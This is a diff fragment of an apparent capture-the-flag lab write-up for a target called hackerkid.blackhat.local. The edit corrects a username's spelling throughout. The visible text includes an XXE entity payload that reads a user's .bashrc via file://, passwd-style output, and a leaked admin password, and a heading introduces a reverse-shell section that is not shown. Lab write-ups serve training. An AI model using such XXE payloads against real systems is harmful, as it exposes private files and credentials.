@@ -53,19 +53,19 @@ On hackerkid.blackhat.local found a registration form sending XML to process.php
 
 Result:
 
-sakat:x:1000:1000:Sakat,,,:/home/sakat:/bin/bash
+saket:x:1000:1000:Saket,,,:/home/saket:/bin/bash
 
 Found user sakat with UID 1000.
 ## 🔑 Password Discovery
 
-Read /home/sakat/.bashrc via XXE:
+Read /home/saket/.bashrc via XXE:
 
-<!ENTITY xxe SYSTEM "file:///home/sakat/.bashrc">
+<!ENTITY xxe SYSTEM "file:///home/saket/.bashrc">
 
 Result:
 
 username="admin"
-password="Sakat!#$%@!!"
+password="Saket!#$%@!!"
 
 ## 🔥 SSTI and Reverse Shell
 
